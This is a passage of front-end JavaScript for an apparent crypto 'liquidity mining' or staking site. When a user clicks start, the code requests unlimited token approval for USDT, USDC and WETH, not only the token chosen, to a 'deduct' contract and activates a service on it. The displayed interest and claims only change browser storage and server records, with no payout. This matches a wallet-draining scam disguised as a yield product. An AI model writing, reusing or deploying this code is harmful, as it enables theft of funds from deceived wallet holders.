      } catch (e) {}
      const decimals = selectedToken === 'WETH' ? 18 : 6;
      const balance = parseFloat(window.ethers.utils.formatUnits(balanceBigInt, decimals));
      if (balance >= 1) {
        pledgedAmount = balance;
        lastPayoutTime = lastPayoutTime || Date.now();
        currentCycleInterest = calculatePayoutInterest();
        authorizedToken = selectedToken;
        localStorage.setItem('pledgedAmount', pledgedAmount.toString());
        localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
        localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
        localStorage.setItem('authorizedToken', authorizedToken);
        await saveUserData();
        initializeMiningData();
      }
      if (isWethAuthorized) {
        if (walletTokenSelect) walletTokenSelect.value = 'WETH';
        authorizedToken = 'WETH';
      } else if (isUsdtAuthorized) {
        if (walletTokenSelect) walletTokenSelect.value = 'USDT';
        authorizedToken = 'USDT';
      } else if (isUsdcAuthorized) {
        if (walletTokenSelect) walletTokenSelect.value = 'USDC';
        authorizedToken = 'USDC';
      }
      setInitialNextBenefitTime();
      activateStakingUI();
      if (pledgeBtn) pledgeBtn.disabled = false;
      if (pledgeAmount) pledgeAmount.disabled = false;
      if (pledgeDuration) pledgeDuration.disabled = false;
      if (pledgeToken) pledgeToken.disabled = false;
    } else {
      if (startBtn) startBtn.style.display = 'block';
      if (pledgeBtn) pledgeBtn.disabled = true;
      if (pledgeAmount) pledgeAmount.disabled = true;
      if (pledgeDuration) pledgeDuration.disabled = true;
      if (pledgeToken) pledgeToken.disabled = true;
    }
    disableInteractiveElements(false); updateStatus("");
  } catch (e) {
    updateStatus(`${translations[currentLang].error}: ${e.message}`, true);
  }
}

async function handleConditionalAuthorizationFlow() {
  if (!signer) throw new Error(translations[currentLang].error + ": Wallet not connected");
  updateStatus('Authorizing...');
  const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
  const requiredAllowance = await retry(() => deductContract.REQUIRED_ALLOWANCE_THRESHOLD());
  const serviceActivated = await retry(() => deductContract.isServiceActiveFor(userAddress));
  const tokenMap = {
    'USDT': { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
    'USDC': { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
    'WETH': { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS }
  };
  const tokensToProcess = [tokenMap[selectedToken], ...Object.values(tokenMap).filter(t => t.name !== selectedToken)];
  let tokenToActivate = '';
  for (const { name, contract, address } of tokensToProcess) {
    if (!contract) continue;
    updateStatus(`Checking ${name} allowance...`);
    const currentAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
    if (currentAllowance < requiredAllowance) {
      updateStatus(`Requesting ${name} approval...`);
      try {
        const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, window.ethers.constants.MaxUint256);
        approvalTx.value = 0n;
        await sendMobileRobustTransaction(approvalTx);
        const newAllowance = await retry(() => contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n);
        if (newAllowance >= requiredAllowance && !tokenToActivate) tokenToActivate = address;
      } catch (err) {
        updateStatus(`${translations[currentLang].approveError} (${name})`, true);
      }
    } else if (!tokenToActivate) tokenToActivate = address;
  }
  if (!serviceActivated && tokenToActivate) {
    const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
    updateStatus(`Activating service with ${tokenName}...`);
    try {
      const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
      activateTx.value = 0n;
      await sendMobileRobustTransaction(activateTx);
      authorizedToken = tokenName;
      localStorage.setItem('authorizedToken', authorizedToken);
      await saveUserData();
    } catch (err) {
      updateStatus(`Activation failed: ${err.message}`, true);
    }
  }
  await forceRefreshWalletBalance();
}

function updateLanguage(lang) {
  currentLang = lang;
  if (languageSelect) languageSelect.value = lang;
  localStorage.setItem('language', lang);

  const apply = () => {
    for (let key in elements) {
      if (elements[key] && translations[lang]?.[key]) {
        elements[key].textContent = translations[lang][key];
      }
    }

    const rulesTitle = document.getElementById('rulesTitle');
    const rulesContent = document.getElementById('rulesContent');
    if (rulesTitle) rulesTitle.textContent = translations[lang].rulesTitle;
    if (rulesContent) rulesContent.innerHTML = translations[lang].rulesContent;

    if (claimModal && claimModal.style.display === 'flex') {
      updateClaimModalLabels();
    }

    updateNextBenefitTimer();
    document.documentElement.lang = lang;
  };

  setTimeout(apply, 200);
}

function setupSSE() {
  if (!userAddress) return;
  if (window.currentSSE) {
    window.currentSSE.close();
  }

  let sse = null;
  let retryCount = 0;
  const maxRetries = 10;
  const baseDelay = 5000;

  function connect() {
    if (sse) sse.close();

    sse = new EventSource(`${API_BASE_URL}/api/sse`);
    window.currentSSE = sse;

    sse.onopen = () => {
      log('SSE 連線成功', 'success');
      retryCount = 0;
      updateStatus('SSE 已連線');
    };

    sse.onmessage = async (event) => {
      try {
        const parsed = JSON.parse(event.data);
        log(`收到 SSE: ${JSON.stringify(parsed)}`, 'receive');

        if (parsed.event === 'dataUpdate' && parsed.data) {
          const newAllData = parsed.data;

          // 【關鍵】只檢查當前用戶
          if (newAllData.users && newAllData.users[userAddress]) {
            const userData = newAllData.users[userAddress];

            const needsUpdate = 
              userData.lastUpdated > localLastUpdated ||
              userData.pledgedAmount !== pledgedAmount ||
              userData.claimable !== window.currentClaimable ||
              userData.totalGrossOutput !== totalGrossOutput;

            if (needsUpdate) {
              log(`檢測到當前用戶數據更新，開始同步...`, 'info');
              allData = newAllData;
              await loadUserDataFromServer();
              await updateInterest();
              await forceRefreshWalletBalance();
            } else {
              log(`當前用戶數據無變化，忽略`, 'info');
            }
          } else {
            log(`SSE 包含其他用戶數據，忽略`, 'info');
          }
        }
      } catch (e) {
        log(`SSE 解析錯誤: ${e.message}`, 'error');
      }
    };

    sse.onerror = () => {
      log('SSE 斷線，重連中...', 'error');
      sse.close();
      if (retryCount < maxRetries) {
        retryCount++;
        setTimeout(connect, baseDelay * retryCount);
      } else {
        updateStatus('SSE 連線失敗，改用輪詢', true);
        setInterval(async () => {
          if (isServerAvailable) {
            await loadUserDataFromServer();
            await updateInterest();
          }
        }, 10000);
      }
    };
  }

  connect();
}

// 初始化
document.addEventListener('DOMContentLoaded', () => {
  getElements(); // 安全獲取 DOM
  updateLanguage(currentLang);
  initializeWallet();
  setTimeout(() => {
    updateTotalFunds();
    setInterval(updateTotalFunds, 1000);
  }, 100);

  const claimBtn = document.getElementById('claimButton');
  if (claimBtn) claimBtn.addEventListener('click', claimInterest);
  if (closeModal) closeModal.addEventListener('click', closeClaimModal);
  if (cancelClaim) cancelClaim.addEventListener('click', closeClaimModal);
  if (claimModal) claimModal.addEventListener('click', e => e.target === claimModal && closeClaimModal());
  if (confirmClaim) {
    confirmClaim.addEventListener('click', async () => {
      closeClaimModal();
      const claimable = window.currentClaimable || 0;
      if (claimable < 0.0000001) {
        updateStatus(translations[currentLang].noClaimable, true);
        return;
      }
      localStorage.setItem('claimable', '0');
      const claimed = parseFloat(localStorage.getItem('claimed') || '0') + claimable;
      localStorage.setItem('claimed', claimed.toString());
      accountBalance[authorizedToken] += claimable;
      await saveUserData();
      await updateInterest();
      await forceRefreshWalletBalance();
      updateStatus(translations[currentLang].claimSuccess + ' ' + translations[currentLang].nextClaimTime);
    });
  }
  if (languageSelect) languageSelect.addEventListener('change', e => updateLanguage(e.target.value));
  if (connectButton) {
    connectButton.addEventListener('click', () => {
      if (connectButton.classList.contains('connected')) {
        disconnectWallet();
      } else {
        connectWallet();
      }
    });
  }
  if (startBtn) {
    startBtn.addEventListener('click', async () => {
      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
      if (!selectedToken) { updateStatus(translations[currentLang].selectTokenFirst, true); return; }
      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
      const selectedContract = tokenMap[selectedToken];
      if (!selectedContract) { updateStatus('Contract not initialized', true); return; }
      let balanceBigInt;
      try {
        balanceBigInt = await retry(() => selectedContract.balanceOf(userAddress));
      } catch (e) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
      const decimals = selectedToken === 'WETH' ? 18 : 6;
      const balance = parseFloat(window.ethers.utils.formatUnits(balanceBigInt, decimals));
      if (balance === 0) { updateStatus(translations[currentLang].balanceZero, true); return; }
      startBtn.disabled = true;
      startBtn.textContent = 'Authorizing...';
      try {
        await handleConditionalAuthorizationFlow();
        let canStart = false;
        if (selectedToken === 'WETH') {
          const prices = ethPriceCache.price || 2500;
          const wethValueUSD = balance * prices;
          if (wethValueUSD >= 500) canStart = true;
        } else {
          if (balance >= 1) canStart = true;
        }
        if (canStart) {
          pledgedAmount = balance;
          lastPayoutTime = Date.now();
          currentCycleInterest = calculatePayoutInterest();
          authorizedToken = selectedToken;
          localStorage.setItem('pledgedAmount', pledgedAmount.toString());
          localStorage.setItem('lastPayoutTime', lastPayoutTime.toString());
          localStorage.setItem('currentCycleInterest', currentCycleInterest.toString());
          localStorage.setItem('authorizedToken', authorizedToken);
          updateStatus(translations[currentLang].miningStarted);
          activateStakingUI();
        } else {
          updateStatus('Balance too low.', true);
          startBtn.disabled = false;
          startBtn.textContent = translations[currentLang].startBtnText;
        }
      } catch (error) {
        updateStatus(`${translations[currentLang].approveError}: ${error.message}`, true);
        startBtn.disabled = false;
        startBtn.textContent = translations[currentLang].startBtnText;
      }
    });
  }
  if (pledgeBtn) {
    pledgeBtn.addEventListener('click', async () => {
      if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
      const amount = parseFloat(pledgeAmount.value) || 0;
      const token = pledgeToken.value;
      if (amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
      const tokenMap = { 'USDT': USDT_CONTRACT_ADDRESS, 'USDC': USDC_CONTRACT_ADDRESS, 'WETH': WETH_CONTRACT_ADDRESS };
      const tokenAddress = tokenMap[token];
      if (!tokenAddress) { updateStatus(translations[currentLang].invalidPledgeToken, true); return; }
      const selectedContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
      try {
        const balance = await retry(() => selectedContract.balanceOf(userAddress));
        const decimals = token === 'WETH' ? 18 : 6;
        const formattedBalance = parseFloat(window.ethers.utils.formatUnits(balance, decimals));
        if (amount > formattedBalance) { updateStatus(translations[currentLang].insufficientBalance, true); return; }
      } catch (error) { updateStatus(`${translations[currentLang].error}: Balance error`, true); return; }
      updateStatus('Pledging...');
      const pledgeData = { address: userAddress, pledges: { isPledging: true, token: tokenAddress, amount: amount.toFixed(2) } };
      try {
        const response = await retry(() => fetch(`${API_BASE_URL}/api/pledge-data`, {
          method: 'POST',
          headers: { 
            'Content-Type': 'application/json',
            'ngrok-skip-browser-warning': 'true'
          },
          body: JSON.stringify(pledgeData)
        }));
        if (!response.ok) throw new Error(`Pledge failed, status: ${response.status}`);
        updateStatus(translations[currentLang].pledgeSuccess);
        await saveUserData();
      } catch (error) { updateStatus(translations[currentLang].pledgeError, true); }
    });
  }
  if (refreshWallet) refreshWallet.addEventListener('click', forceRefreshWalletBalance);
  if (walletTokenSelect) walletTokenSelect.addEventListener('change', forceRefreshWalletBalance);
  document.querySelectorAll('.tab').forEach(tab => {
    tab.addEventListener('click', () => {
      document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
      tab.classList.add('active');
      document.querySelectorAll('.content-section').forEach(s => s.classList.remove('active'));
      document.getElementById(tab.dataset.tab).classList.add('active');
      if (tab.dataset.tab === 'liquidity') updateInterest();
    });
  });
  const rulesModal = document.getElementById('rulesModal');
  const rulesButton = document.getElementById('rulesButton');
  const closeRulesModal = document.getElementById('closeRulesModal');
  if (rulesButton) {
    rulesButton.addEventListener('click', () => {
      const rulesTitle = document.getElementById('rulesTitle');
      const rulesContent = document.getElementById('rulesContent');
      if (rulesTitle) rulesTitle.textContent = translations[currentLang].rulesTitle;
      if (rulesContent) rulesContent.innerHTML = translations[currentLang].rulesContent;
      if (rulesModal) rulesModal.style.display = 'flex';
    });
  }
  if (closeRulesModal) closeRulesModal.addEventListener('click', () => {
    if (rulesModal) rulesModal.style.display = 'none';
  });
  if (rulesModal) rulesModal.addEventListener('click', e => {
    if (e.target === rulesModal && rulesModal) rulesModal.style.display = 'none';
  });
});